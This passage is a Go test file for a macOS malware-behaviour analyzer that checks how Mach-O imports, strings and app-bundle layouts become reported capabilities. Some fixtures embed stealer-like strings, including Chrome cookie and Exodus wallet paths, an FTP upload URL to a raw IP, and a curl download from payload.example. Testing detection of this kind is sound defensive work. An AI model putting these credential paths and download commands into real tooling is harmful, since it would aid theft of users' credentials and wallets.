	}
	for _, executionRoot := range rep.ExecutionRoots {
		if executionRoot.Kind == "launchd-program" {
			t.Fatalf("ZIP member name manufactured a launchd root: %#v", rep.ExecutionRoots)
		}
	}
	assertOperationConnectivity(t, rep, behavior.OperationProcessExecute, behavior.ConnectivityUnknown)
}

func TestInspectFatMachOArchitectureFilter(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "fat")
	if err := os.WriteFile(path, fatMachOFixture(t), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{Architecture: "x86_64"})
	if err != nil {
		t.Fatal(err)
	}
	var gotX86 bool
	for _, feature := range rep.Features {
		if feature.Key == "macho.filetype" && feature.Architecture == "x86_64" {
			gotX86 = true
		}
		if feature.Architecture == "arm64" {
			t.Fatalf("arm64 features should be filtered out: %#v", rep.Features)
		}
	}
	if !gotX86 {
		t.Fatalf("missing x86_64 Mach-O feature: %#v", rep.Features)
	}
	var skippedArm64 bool
	for _, coverage := range rep.Coverage {
		if coverage.AnalysisArea == "macho/arm64" && coverage.Status == "skipped" {
			skippedArm64 = true
		}
	}
	if !skippedArm64 {
		t.Fatalf("missing skipped arm64 coverage: %#v", rep.Coverage)
	}
}

func TestInspectMalformedMachOReportsCoverage(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "malformed")
	if err := os.WriteFile(path, []byte{0xcf, 0xfa, 0xed, 0xfe, 0x00}, 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCoverageContains(t, rep, "macho", "partial", "Mach-O parse failed")
	if len(rep.Capabilities) != 0 {
		t.Fatalf("malformed Mach-O should not produce capabilities: %#v", rep.Capabilities)
	}
}

func TestMachOImportedOnlyDoesNotCreateCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "import-only.o")
	if err := os.WriteFile(path, machoObjectWithSecItemCall(false), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.keychain-access") {
		t.Fatalf("imported-only Keychain API should not become capabilityMatch: %#v", rep.Capabilities)
	}
	if hasCapability(rep, "macos.keychain-item-query") {
		t.Fatalf("imported-only Keychain API should not become a query capability: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "macho.security_api_import", "SecItemCopyMatching")
	assertFeatureQualifier(t, rep, "macho.security_api_import", "SecItemCopyMatching", "category", "keychain")
}

func TestMachOCalledImportCreatesFunctionScopedCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "called.o")
	if err := os.WriteFile(path, machoObjectWithSecItemCall(true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.keychain-item-query")
	if hasCapability(rep, "macos.keychain-access") {
		t.Fatalf("generic SecItemCopyMatching call must not claim credential access: %#v", rep.Capabilities)
	}
	var scoped bool
	for _, evidence := range rep.Evidence {
		if evidence.Kind == "imported-call" && evidence.Function == "main" && strings.Contains(evidence.Value, "SecItemCopyMatching") {
			scoped = true
		}
	}
	if !scoped {
		t.Fatalf("missing function-scoped imported call evidence: %#v", rep.Evidence)
	}
}

func TestMachOGenericCalledImportStaysOutOfReport(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "printf.o")
	if err := os.WriteFile(path, machoObjectWithImportedCall("printf", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Capabilities) != 0 || len(rep.Operations) != 0 {
		t.Fatalf("generic imported call should not create behavior: capabilities=%#v operations=%#v", rep.Capabilities, rep.Operations)
	}
	for _, feature := range rep.Features {
		if feature.Key == "macho.import_call" {
			t.Fatalf("generic imported call should not become import-call feature: %#v", rep.Features)
		}
	}
	for _, evidence := range rep.Evidence {
		if evidence.Kind == "imported-call" {
			t.Fatalf("generic imported call should not become scoped-call evidence: %#v", rep.Evidence)
		}
	}
}

func TestMachOCalledSQLiteOpenStaysNeutralWithoutFlagsOrMode(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sqlite-open")
	if err := os.WriteFile(path, machoObjectWithImportedCall("sqlite3_open", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Capabilities) != 1 || rep.Capabilities[0].RuleID != "macos.file-open" {
		t.Fatalf("sqlite open should create only the exact filesystem-open primitive: %#v", rep.Capabilities)
	}
	var fileRead bool
	for _, item := range rep.Operations {
		if item.Kind == "file.read" {
			fileRead = true
		}
	}
	if fileRead {
		t.Fatalf("sqlite3_open without recovered flags/mode must not claim file.read: %#v", rep.Operations)
	}
	assertFeature(t, rep, "macho.import_call", "sqlite3_open")
}

func TestMachOCalledSystemCreatesNativeProcessCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "system-call")
	if err := os.WriteFile(path, machoObjectWithImportedCall("system", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	// This fixture is an MH_OBJECT with no structural execution root. A local symbol
	// named main is insufficient to claim execution-root connectivity.
	assertCapabilityWithConnectivity(t, rep, "macos.native-process-execution", string(behavior.ConnectivityUnknown))
}

func TestMachOCalledScreenshotAPICreatesCollectionCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "screenshot-call")
	if err := os.WriteFile(path, machoObjectWithImportedCall("CGDisplayCreateImage", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.screen-capture")
	assertResource(t, rep, "macos.screen-capture", "screenshot", "")
}

func TestMachOImportedScreenshotAPIStaysFeature(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "screenshot-import")
	if err := os.WriteFile(path, machoObjectWithImportedCall("CGDisplayCreateImage", false), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.screen-capture") {
		t.Fatalf("imported-only screenshot API should not become capabilityMatch: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "macho.security_api_import", "CGDisplayCreateImage")
	assertFeatureQualifier(t, rep, "macho.security_api_import", "CGDisplayCreateImage", "category", "screenshot")
}

func TestMachOCalledLoginItemSetterWithoutBooleanStaysFeatureOnly(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "loginitem-call")
	if err := os.WriteFile(path, machoObjectWithImportedCall("SMLoginItemSetEnabled", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.login-item") {
		t.Fatalf("SMLoginItemSetEnabled may disable the item and must not become persistence without its boolean argument: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "macho.import_call", "SMLoginItemSetEnabled")
}

func TestMachOImportedLoginItemAPIStaysFeature(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "loginitem-import")
	if err := os.WriteFile(path, machoObjectWithImportedCall("SMLoginItemSetEnabled", false), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.login-item") {
		t.Fatalf("imported-only login item API should not become capabilityMatch: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "macho.security_api_import", "SMLoginItemSetEnabled")
	assertFeatureQualifier(t, rep, "macho.security_api_import", "SMLoginItemSetEnabled", "category", "login-item")
}

func TestMachOCalledLibcurlCreatesNetworkImplementationObservation(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "curl-call")
	if err := os.WriteFile(path, machoObjectWithImportedCall("curl_easy_perform", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	for _, item := range rep.NetworkImplementations {
		if item.Kind == behavior.NetworkImplementationAPICall && item.HTTPImplementation == "libcurl" && item.TLSProvider == "libcurl-selected TLS backend" {
			return
		}
	}
	t.Fatalf("missing called libcurl network implementation observation: %#v", rep.NetworkImplementations)
}

func TestMachOCalledLibcurlObservationIsFunctionScopedWithoutOperation(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "scoped-curl-call")
	if err := os.WriteFile(path, machoObjectWithImportedCall("curl_easy_perform", true), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.Operations) != 0 {
		t.Fatalf("libcurl handle call without configured URL provenance became an operation: %#v", rep.Operations)
	}
	for _, observation := range rep.NetworkImplementations {
		if observation.Kind != behavior.NetworkImplementationAPICall || observation.APIOrTool != "curl_easy_perform" {
			continue
		}
		if observation.ScopeID == "" {
			t.Fatalf("called import observation should carry function scope: %#v", observation)
		}
		if !hasScopeID(rep, observation.ScopeID) {
			t.Fatalf("missing function scope %q for observation %#v in scopes %#v", observation.ScopeID, observation, rep.Scopes)
		}
		return
	}
	t.Fatalf("missing scoped libcurl call observation: %#v", rep.NetworkImplementations)
}

func hasScopeID(rep Report, id string) bool {
	for _, scope := range rep.Scopes {
		if scope.ID == id && scope.Kind == "function" && scope.Function != "" {
			return true
		}
	}
	return false
}

func TestMachOSensitiveResourceStringWithNodeCorroboratorStaysFeature(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "stealer-ish")
	data := append(machoObjectWithImportedCall("curl_easy_perform", false),
		[]byte("\x00~/Library/Application Support/Google/Chrome/Default/Cookies\x00~/Library/Application Support/Exodus/exodus.wallet/passphrase.json\x00http://localhost:8000/api/%@/%ld\x00")...)
	if err := os.WriteFile(path, data, 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.browser-credential-collection") || hasCapability(rep, "macos.credential-material-collection") {
		t.Fatalf("node-level Mach-O strings and imports should not become collection capabilities: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "macho.sensitive_resource", "~/Library/Application Support/Google/Chrome/Default/Cookies")
	assertFeature(t, rep, "macho.sensitive_resource", "~/Library/Application Support/Exodus/exodus.wallet/passphrase.json")
	assertNetworkDestination(t, rep, "http://localhost:8000/api/%@/%ld")
}

func TestMachOSensitiveResourceStringWithoutCorroboratorStaysFeature(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "docs-with-path")
	data := append(machoObjectWithImportedCall("printf", false),
		[]byte("\x00~/Library/Application Support/Google/Chrome/Default/Cookies\x00")...)
	if err := os.WriteFile(path, data, 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.browser-credential-collection") {
		t.Fatalf("uncorroborated Mach-O path string should not become a capability: %#v", rep.Capabilities)
	}
	assertFeature(t, rep, "macho.sensitive_resource", "~/Library/Application Support/Google/Chrome/Default/Cookies")
}

func TestMachOCommonStaticURLsStayOutOfNetworkDestinations(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "go-ish")
	data := append(machoObjectWithImportedCall("printf", false),
		[]byte("\x00https://go.dev/pkg/crypto/rsa\x00http://www.apple.com/DTDs/PropertyList-1.0.dtd\x00http://ocsp.apple.com/ocsp03\x00http://crl.verisign.com/pca3.crl\x00http://ns.adobe.com/xap/1.0/\x00http://bugreports.qt.io\x00https://%s/report\x00https://real.example/path\x00https://core.example/api\\\\\x00ftp://45.77.179.89/upload/out.zip\x00")...)
	if err := os.WriteFile(path, data, 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertNoNetworkDestination(t, rep, "https://go.dev/pkg/crypto/rsa")
	assertNoNetworkDestination(t, rep, "http://www.apple.com/DTDs/PropertyList-1.0.dtd")
	assertNoNetworkDestination(t, rep, "http://ocsp.apple.com/ocsp03")
	assertNoNetworkDestination(t, rep, "http://crl.verisign.com/pca3.crl")
	assertNoNetworkDestination(t, rep, "http://ns.adobe.com/xap/1.0/")
	assertNoNetworkDestination(t, rep, "http://bugreports.qt.io")
	assertNoNetworkDestination(t, rep, "https://%s/report")
	assertNetworkDestination(t, rep, "https://real.example/path")
	assertNetworkDestination(t, rep, "https://core.example/api")
	assertNoNetworkDestination(t, rep, "https://core.example/api\\\\")
	assertNetworkDestination(t, rep, "ftp://45.77.179.89/upload/out.zip")
}

func TestAppPrimaryMachOFunctionScopeRunsByDefault(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Binary.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Binary</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Binary"), machoObjectWithSecItemCall(true), 0o700); err != nil {
		t.Fatal(err)
	}

	shallow, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, shallow, "macos.keychain-item-query")
	if hasCapability(shallow, "macos.keychain-access") {
		t.Fatalf("generic SecItemCopyMatching call must not claim credential access: %#v", shallow.Capabilities)
	}
	assertCoverageContains(t, shallow, "macho-function-scope/x86_64", "partial", "function boundaries")

	deep, err := InspectPath(app, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, deep, "macos.keychain-item-query")
}

func TestAppHelperMachOFunctionScopeRunsByDefault(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Binary.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	helper := filepath.Join(app, "Contents", "Frameworks", "Binary Helper.app", "Contents", "MacOS", "Binary Helper")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Dir(helper), 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Binary</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Binary"), machoObjectWithImportedCall("printf", true), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(helper, machoObjectWithSecItemCall(true), 0o700); err != nil {
		t.Fatal(err)
	}

	rep, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	helperLogical := "Binary.app/Contents/Frameworks/Binary Helper.app/Contents/MacOS/Binary Helper"
	var helperNodeID string
	for _, node := range rep.ArtifactNodes {
		if node.LogicalPath == helperLogical {
			helperNodeID = node.ID
			break
		}
	}
	if helperNodeID == "" {
		t.Fatalf("missing helper artifact node %q: %#v", helperLogical, rep.ArtifactNodes)
	}
	for _, root := range rep.ExecutionRoots {
		if root.StartNodeID == helperNodeID {
			t.Fatalf("bundle helper without an independent trigger became an execution root: %#v", rep.ExecutionRoots)
		}
	}
	for _, target := range rep.InvokedTargets {
		if target.NodeID == helperNodeID {
			t.Fatalf("bundle helper without launch evidence became an invoked target: %#v", rep.InvokedTargets)
		}
	}
	var helperCapability bool
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID == "macos.keychain-item-query" && capabilityMatch.SubjectNodeID == helperNodeID {
			helperCapability = true
			break
		}
	}
	if !helperCapability {
		t.Fatalf("default analysis should recover the helper's keychain capability: %#v", rep.Capabilities)
	}
	for _, coverage := range rep.Coverage {
		if coverage.NodeID == helperNodeID && coverage.AnalysisArea == "macho-function-scope/x86_64" && coverage.Status == "partial" {
			return
		}
	}
	t.Fatalf("helper function-scope analysis should run by default: %#v", rep.Coverage)
}

func TestNonPrimaryAppMachOFunctionScopeRequiresIncludeUnreferenced(t *testing.T) {
	root := t.TempDir()
	app := filepath.Join(root, "Binary.app")
	macos := filepath.Join(app, "Contents", "MacOS")
	if err := os.MkdirAll(macos, 0o700); err != nil {
		t.Fatal(err)
	}
	info := `<plist><dict><key>CFBundleExecutable</key><string>Binary</string></dict></plist>`
	if err := os.WriteFile(filepath.Join(app, "Contents", "Info.plist"), []byte(info), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Binary"), machoObjectWithImportedCall("printf", true), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(macos, "Helper"), machoObjectWithSecItemCall(true), 0o700); err != nil {
		t.Fatal(err)
	}

	shallow, err := InspectPath(app, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(shallow, "macos.keychain-item-query") {
		t.Fatalf("default app scan should leave non-primary Mach-O function scope for --include-unreferenced: %#v", shallow.Capabilities)
	}
	assertCoverageContains(t, shallow, "macho-function-scope/x86_64", "skipped", "non-primary")

	deep, err := InspectPath(app, artifact.Options{IncludeUnreferenced: true})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, deep, "macos.keychain-item-query")
	if hasCapability(deep, "macos.keychain-access") {
		t.Fatalf("generic SecItemCopyMatching call must not claim credential access: %#v", deep.Capabilities)
	}
}

func TestMachOStubCallCreatesFunctionScopedCapability(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "stubbed")
	if err := os.WriteFile(path, machoLinkedStubFixture(), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCapability(t, rep, "macos.keychain-item-query")
	if hasCapability(rep, "macos.keychain-access") {
		t.Fatalf("generic SecItemCopyMatching stub call must not claim credential access: %#v", rep.Capabilities)
	}
	var scoped bool
	for _, evidence := range rep.Evidence {
		if evidence.Kind == "imported-stub-call" && evidence.Function == "main" && strings.Contains(evidence.Value, "SecItemCopyMatching") {
			scoped = true
		}
	}
	if !scoped {
		t.Fatalf("missing function-scoped imported stub call evidence: %#v", rep.Evidence)
	}
}

func TestInspectEncryptedMachOReportsCoverage(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "encrypted")
	if err := os.WriteFile(path, machoWithEncryptionInfo(), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertArtifactProperty(t, rep, "macho-encryption", "encrypted")
	assertCoverageContains(t, rep, "macho-byte-analysis/x86_64", "partial", "skipped byte-derived")
}

func TestMachOFunctionStartsRecoverDirectLocalCall(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "stripped")
	if err := os.WriteFile(path, strippedMachOWithFunctionStarts(), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertCoverageContains(t, rep, "macho-function-scope/x86_64", "partial", "direct calls, and string xrefs recovered conservatively")
	for _, feature := range rep.Features {
		if feature.Key == "macho.function_call" {
			t.Fatalf("direct local calls should stay out of report features: %#v", rep.Features)
		}
	}
}

func TestMachOCodeSignatureArtifactProperty(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "signed")
	if err := os.WriteFile(path, machoWithCodeSignature(), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	assertArtifactProperty(t, rep, "code-signature-structure", "present")
	assertArtifactProperty(t, rep, "code-directory-identifier", "com.example.maratus")
	assertArtifactProperty(t, rep, "code-directory-team-id", "TEAMID1234")
	assertArtifactProperty(t, rep, "entitlements-xml", "present")
	assertArtifactProperty(t, rep, "entitlements-der", "present")
	assertArtifactProperty(t, rep, "entitlement", "com.apple.security.get-task-allow")
	assertArtifactProperty(t, rep, "entitlement", "com.apple.security.network.client")
	assertArtifactProperty(t, rep, "entitlement-context", "debuggable")
	assertArtifactProperty(t, rep, "entitlement-context", "library-validation-disabled")
	assertArtifactProperty(t, rep, "entitlement-context", "network-client")
	assertArtifactProperty(t, rep, "entitlement-keychain-access-group", "TEAMID1234.com.example.maratus")
}

func TestCloseNegativeCurlWithoutExecution(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "download.sh")
	if err := os.WriteFile(path, []byte("curl https://payload.example/update -o /tmp/update\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	rep, err := InspectPath(path, artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.download-execute") {
		t.Fatalf("download alone should not be download-execute: %#v", rep.Capabilities)
	}
}

func assertCapability(t *testing.T, rep Report, ruleID string) {
	t.Helper()
	if !hasCapability(rep, ruleID) {
		t.Fatalf("missing capability %s: %#v", ruleID, rep.Capabilities)
	}
}

func assertCapabilityConnectivity(t *testing.T, rep Report, ruleID, want string) {
	t.Helper()
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID == ruleID {
			if string(capabilityMatch.Execution.Connectivity) != want {
				t.Fatalf("capability %s connectivity = %s, want %s", ruleID, capabilityMatch.Execution.Connectivity, want)
			}
			return
		}
	}
	t.Fatalf("missing capability %s: %#v", ruleID, rep.Capabilities)
}

func assertCapabilityWithConnectivity(t *testing.T, rep Report, ruleID, want string) {
	t.Helper()
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID == ruleID && string(capabilityMatch.Execution.Connectivity) == want {
			return
		}
	}
	t.Fatalf("missing capability %s with connectivity %s: %#v", ruleID, want, rep.Capabilities)
}

func hasCapability(rep Report, ruleID string) bool {
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID == ruleID {
			return true
		}
	}
	return false
}

func assertResource(t *testing.T, rep Report, ruleID, category, concrete string) {
	t.Helper()
	for _, capabilityMatch := range rep.Capabilities {
		if capabilityMatch.RuleID != ruleID {
			continue
		}
		for _, resource := range capabilityMatch.AffectedResources {
			if testReportResourceCategory(resource) == category && resource.Value == concrete {
				return
			}
		}
	}
	t.Fatalf("missing resource %s %s on %s: %#v", category, concrete, ruleID, rep.Capabilities)
}

func assertEvidenceValue(t *testing.T, rep Report, value string) {
	t.Helper()
	for _, evidence := range rep.Evidence {
		if evidence.Value == value {
			return
		}
	}
	t.Fatalf("missing evidence value %q: %#v", value, rep.Evidence)
}

func assertArtifactNode(t *testing.T, rep Report, logical, kind string) {
	t.Helper()
	for _, node := range rep.ArtifactNodes {
		if node.LogicalPath == logical && node.Kind == kind {
			return
		}
	}
	t.Fatalf("missing artifact node %s kind %s: %#v", logical, kind, rep.ArtifactNodes)
}

func assertOperation(t *testing.T, rep Report, kind behavior.OperationKind, category, concrete string) {
	t.Helper()
	for _, operation := range rep.Operations {
		if operation.Kind == kind && testOperationHasReportResource(operation, category, concrete) {
			return
		}
	}
	t.Fatalf("missing operation %s %s %s: %#v", kind, category, concrete, rep.Operations)
}

func assertNoOperation(t *testing.T, rep Report, kind behavior.OperationKind, category, concrete string) {
	t.Helper()
	for _, operation := range rep.Operations {
		if operation.Kind == kind && testOperationHasReportResource(operation, category, concrete) {
			t.Fatalf("unexpected operation %s %s %s: %#v", kind, category, concrete, rep.Operations)
		}
	}
}

func assertDownloadExecuteRelationPath(t *testing.T, rep Report, withMakeExecutable bool) {
	t.Helper()
	if hasDownloadExecuteRelationPath(rep, withMakeExecutable) {
		return
	}
	t.Fatalf("missing download/execute relation path (make-executable=%v): operations=%#v relations=%#v", withMakeExecutable, rep.Operations, rep.OperationRelations)
}

func assertCallRelation(t *testing.T, rep Report, targetFunction string) {
	t.Helper()
	scopes := make(map[string]behavior.Scope, len(rep.Scopes))
	for _, scope := range rep.Scopes {
		scopes[scope.ID] = scope
	}
	for _, relation := range rep.OperationRelations {
		if relation.Kind == behavior.RelationCalls && relation.From.Kind == behavior.RelationEndpointScope && relation.To.Kind == behavior.RelationEndpointScope && scopes[relation.To.ID].Function == targetFunction {
			return
		}
	}
	t.Fatalf("missing calls relation to function %q: %#v", targetFunction, rep.OperationRelations)
}

func assertNoDownloadExecuteRelationPath(t *testing.T, rep Report, withMakeExecutable bool) {
	t.Helper()
	if hasDownloadExecuteRelationPath(rep, withMakeExecutable) {
		t.Fatalf("unexpected download/execute relation path (make-executable=%v): %#v", withMakeExecutable, rep.OperationRelations)
	}
}

func hasDownloadExecuteRelationPath(rep Report, withMakeExecutable bool) bool {
	operations := make(map[string]behavior.OperationKind, len(rep.Operations))
	precedes := make(map[string][]string)
	for _, operation := range rep.Operations {
		operations[operation.ID] = operation.Kind
	}
	for _, relation := range rep.OperationRelations {
		if relation.Kind == behavior.RelationPrecedes {
			precedes[relation.From.ID] = append(precedes[relation.From.ID], relation.To.ID)
		}
	}
	for from, targets := range precedes {
		if operations[from] != behavior.OperationNetworkDownload {
			continue
		}
		for _, target := range targets {
			if !withMakeExecutable && executionOperationKind(operations[target]) {
				return true
			}
			if withMakeExecutable && operations[target] == behavior.OperationFileMakeExecutable {
				for _, execute := range precedes[target] {
					if executionOperationKind(operations[execute]) {
						return true
					}
				}
			}
		}
	}
	return false
}

func executionOperationKind(kind behavior.OperationKind) bool {
	return kind == behavior.OperationProcessExecute || kind == behavior.OperationInterpreterInvoke
}

func assertExecutionRecord(t *testing.T, rep Report, kind, name string) {
	t.Helper()
	for _, root := range rep.ExecutionRoots {
		if root.Kind == kind && root.Name == name {
			return
		}
	}
	for _, target := range rep.InvokedTargets {
		if target.Kind == kind && invokedTargetMatchesName(rep, target, name) {
			return
		}
	}
	t.Fatalf("missing execution record %s %s: roots=%#v targets=%#v", kind, name, rep.ExecutionRoots, rep.InvokedTargets)
}

func assertOperationConnectivity(t *testing.T, rep Report, kind behavior.OperationKind, connectivity behavior.Connectivity) {
	t.Helper()
	for _, operation := range rep.Operations {
		if operation.Kind == kind && operation.Execution.Connectivity == connectivity {
			return
		}
	}
	t.Fatalf("missing operation %s with connectivity %s: %#v", kind, connectivity, rep.Operations)
}

func assertNoExecutionRecord(t *testing.T, rep Report, kind, name string) {
	t.Helper()
	for _, root := range rep.ExecutionRoots {
		if root.Kind == kind && root.Name == name {
			t.Fatalf("unexpected execution root %s %s: %#v", kind, name, rep.ExecutionRoots)
		}
	}
	for _, target := range rep.InvokedTargets {
		if target.Kind == kind && invokedTargetMatchesName(rep, target, name) {
			t.Fatalf("unexpected invoked target %s %s: %#v", kind, name, rep.InvokedTargets)
		}
	}
}

func assertInvokedTargetFromAppMain(t *testing.T, rep Report, targetName, resourceValue string) {
	t.Helper()
	appMainID := ""
	for _, entry := range rep.ExecutionRoots {
		if entry.Kind == "app-main" {
			appMainID = entry.ID
		}
		if entry.Name == targetName {
			t.Fatalf("invoked target %q became a second execution root: %#v", targetName, rep.ExecutionRoots)
		}
	}
	if appMainID == "" {
		t.Fatalf("missing app-main execution root: %#v", rep.ExecutionRoots)
	}
	for _, operation := range rep.Operations {
		if !testOperationHasReportValue(operation, resourceValue) {
			continue
		}
		if operation.Execution.Connectivity != behavior.ConnectivityConnected || !slices.Contains(operation.Execution.ExecutionRootIDs, appMainID) {
			t.Fatalf("invoked target operation should be connected to app-main: %#v", operation)
		}
		return
	}
	t.Fatalf("missing invoked-target operation for %q: %#v", resourceValue, rep.Operations)
}

func testOperationHasReportValue(operation behavior.ModeledOperation, value string) bool {
	for _, binding := range operation.ResourceBindings {
		if binding.Resource.Value == value {
			return true
		}
	}
	return false
}

func testOperationHasReportResource(operation behavior.ModeledOperation, category, value string) bool {
	for _, binding := range operation.ResourceBindings {
		if testReportResourceCategory(binding.Resource) == category && binding.Resource.Value == value {
			return true
		}
	}
	return false
}

func testReportResourceCategory(resource behavior.Resource) string {
	for _, classification := range resource.Classifications {
		switch classification {
		case behavior.ResourceClassBrowserCookieStore:
			return "browser.cookies"
		case behavior.ResourceClassBrowserPasswordStore:
			return "browser.password-store"
		case behavior.ResourceClassCloudCredentialStore:
			return "cloud-credentials"
		case behavior.ResourceClassCryptoWalletStore:
			return "crypto-wallet"
		case behavior.ResourceClassDeveloperTokenStore:
			return "developer-token"
		case behavior.ResourceClassKeychain:
			return "keychain"
		case behavior.ResourceClassLaunchAgent:
			return "launch-agent"
		case behavior.ResourceClassLaunchDaemon:
			return "launch-daemon"
		case behavior.ResourceClassPackage:
			return "package"
		case behavior.ResourceClassScreenshot:
			return "screenshot"
		case behavior.ResourceClassShellProfile:
			return "shell-profile"
		case behavior.ResourceClassSSHPrivateKey:
			return "ssh-private-key"
		}
	}
	switch resource.Kind {
	case behavior.ResourceURL, behavior.ResourceNetworkEndpoint:
		return "network-destination"
	case behavior.ResourceCredential:
		return "user-password"
	case behavior.ResourceScreen:
		return "screenshot"
	default:
		return string(resource.Kind)
	}
}

func assertExecutionRecordArguments(t *testing.T, rep Report, kind, name string, command []string) {
	t.Helper()
	for _, root := range rep.ExecutionRoots {
		arguments := append([]string{root.Interpreter}, root.Arguments...)
		if root.Interpreter == "" {
			arguments = root.Arguments
		}
		if root.Kind == kind && root.Name == name && stringSlicesEqual(arguments, command) {
			return
		}
	}
	for _, target := range rep.InvokedTargets {
		arguments := append([]string{target.Interpreter}, target.Arguments...)
		if target.Interpreter == "" {
			arguments = target.Arguments
		}
